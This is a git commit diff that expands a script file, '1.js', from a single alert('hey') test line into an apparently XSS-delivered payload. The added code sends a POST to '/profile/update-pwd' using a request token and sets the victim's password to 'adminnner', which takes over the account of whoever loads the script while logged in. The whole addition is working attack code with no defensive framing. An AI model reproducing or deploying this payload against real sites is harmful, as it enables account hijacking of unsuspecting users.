8e4c0f1c6f9506a9c410b7eb1f206a665a4acf9b
sn <mohamed.daoud2015@gmail.com>
2024-11-14 17:24:44 +0100

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,24 @@
 alert("hey");
+
+
+var data = new URLSearchParams();
+data.append('z', req_id);
+data.append('pwd[new]', 'adminnner');
+data.append('pwd[new2]', 'adminnner');
+data.append('submit', 'غير كلمة السر');
+
+// Send the POST request
+fetch('/profile/update-pwd', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+  },
+  body: data.toString()
+})
+.then(response => response.json())  // Assuming the response is in JSON format
+.then(data => {
+  console.log('Success:', data);
+})
+.catch(error => {
+  console.error('Error:', error);
+});
